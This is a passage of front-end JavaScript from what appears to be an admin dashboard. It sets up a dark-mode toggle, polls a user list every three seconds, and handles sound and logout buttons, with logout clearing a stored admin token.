    if (savedTheme === 'dark') document.body.classList.add('dark-mode');
    const btn = document.getElementById('themeToggleBtn');
    btn.onclick = () => { 
        document.body.classList.toggle('dark-mode'); 
        localStorage.setItem('theme', document.body.classList.contains('dark-mode') ? 'dark' : 'light'); 
    };
}

// ==================== INITIALIZATION ====================
setupTheme();
fetchUsers();
setInterval(fetchUsers, 3000);

document.getElementById('soundToggleBtn').onclick = toggleSound;
document.getElementById('logoutBtn').onclick = () => { 
    localStorage.removeItem('adminToken'); 
    window.location.href = '/admin/login'; 
};
</script>
